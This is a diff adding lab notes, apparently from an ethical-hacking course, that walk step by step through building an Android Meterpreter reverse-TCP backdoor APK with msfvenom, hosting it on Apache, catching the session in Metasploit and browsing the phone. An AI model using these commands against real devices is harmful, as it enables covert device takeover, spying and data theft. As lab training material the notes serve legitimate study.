@@ -1,11 +1,24 @@
 Mobile devices allow communication between users on radio frequencies, whether GSM, LTE, 5G, or Wi-Fi. They can be used to send multimedia content, email, and perform many more tasks using the Internet. Mobile security is becoming increasingly challenging with the emergence of complex attacks that use multiple attack vectors to compromise mobile devices. These security threats exploit critical data as well as financial information and other details of mobile users and may also damage the reputation of mobile networks and organizations.
-================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
+==================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
 
 # Hack an Android Device by Creating Binary Payloads using Parrot Security
 --------------------------------------------------------------------------
+>>> PARROT MACHINE [ATTACKER/10.10.1.13]
+1. service postgresql start
+2. msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk
+3. mkdir /var/www/html/share   >>  chmod -R 755 /var/www/html/share   >>  chown -R www-data:www-data /var/www/html/share
+4. service apache2 start    >>    cp /root/Desktop/Backdoor.apk /var/www/html/share/
+5. msfconsole   >>  use exploit/multi/handler   >>  set payload android/meterpreter/reverse_tcp   >>  show options(set lhost,lport)   >>   exploit -j -z 
+>>> ANDROID MACHINE [TARGET/10.10.1.14]
+6. Open Chrome Browser  >>  http://10.10.1.13/share(Enter url)  >> Download file(Backdoor.apk)  >> Install and open the Backdoor.apk(malicious file)
+>>> PARROT MACHINE [ATTACKER/10.10.1.19]
+7. sessions -i 1 (in msf to open meterpreter session)
+8. sysinfo   >>  ipconfig  >> pwd
+9. cd /sdcard  (/storage/emulated/0)
+10. ps (show the running process in android)
+11. help (Because of poor security settings and a lack of awareness, if an individual in an organization installs a backdoor file on their device, the attacker gains control of the device. The attacker can then perform malicious activities such as uploading worms, downloading data, and spying on the user’s keystrokes, which can reveal sensitive information related to the organization as well as the victim)
 
-
-
+==================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
 
 
 
